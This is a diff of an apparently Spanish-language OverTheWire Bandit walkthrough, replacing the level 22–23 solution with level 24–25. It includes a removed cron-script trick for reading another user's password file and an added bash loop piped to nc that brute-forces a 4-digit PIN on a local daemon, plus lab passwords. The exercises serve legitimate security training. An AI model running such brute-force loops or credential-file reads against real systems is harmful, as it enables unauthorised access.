@@ -1,50 +1,37 @@
-
-# Level 22--23
+# Level 24--25
 ## Objetivo
+Un demonio está escuchando en el puerto 30002 y le dará la contraseña de bandit25 si se le da la contraseña de bandit24 y un código PIN numérico secreto de 4 dígitos. No hay forma de recuperar el código PIN excepto revisando todas las 10000 combinaciones, lo que se denomina fuerza bruta.  
+No es necesario crear nuevas conexiones cada vez.
 
 ```
-Server    : bbandit22@bandit.labs.overthewire.org
-Password  : WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff
-
-
+Server    : bbandit24@bandit.labs.overthewire.org
+Password  : VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
 ```
 ## Solución
 ```bash
-ssh bandit22@bandit.labs.overthewire.org -p 2220
+ssh bandit24@bandit.labs.overthewire.org -p 2220
 
-bandit22@bandit:~$ ls /etc/cron.d
-cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24       e2scrub_all  sysstat
-cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root  otw-tmp-dir
+bandit24@bandit:~$ nc -v localhost 30002
+Connection to localhost (127.0.0.1) 30002 port [tcp/*] succeeded!
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 123
+Wrong! Please enter the correct pincode. Try again.
+VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 987
+Wrong! Please enter the correct pincode. Try again.
+^C
+bandit24@bandit:~$ for i in {0000..0003}; do echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i ; done
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0000
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0001
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0002
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0003
+bandit24@bandit:~$ for i in {0000..9999}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | nc localhost 30002 | grep -v Wrong
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
 
-bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23
-@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
-* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+Correct!
+The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
 
-bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh
-#!/bin/bash
-
-myname=$(whoami)
-mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
-
-echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
-
-cat /etc/bandit_pass/$myname > /tmp/$mytarget
-
-bandit22@bandit:~$ whoami
-bandit22
-
-bandit22@bandit:~$ myname=bandit23
-
-bandit22@bandit:~$ echo $(echo I am user $myname | md5sum | cut -d ' ' -f 1)
-8ca319486bfbbc3663ea0fbe81326349
-
-bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
-QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
-
-bandit22@bandit:~$ exit
-logout
-Connection to bandit.labs.overthewire.org closed.
-
+Exiting.
+bandit24@bandit:~$
 ```
 ## Notas adicionales
 | Comando | Descripción |
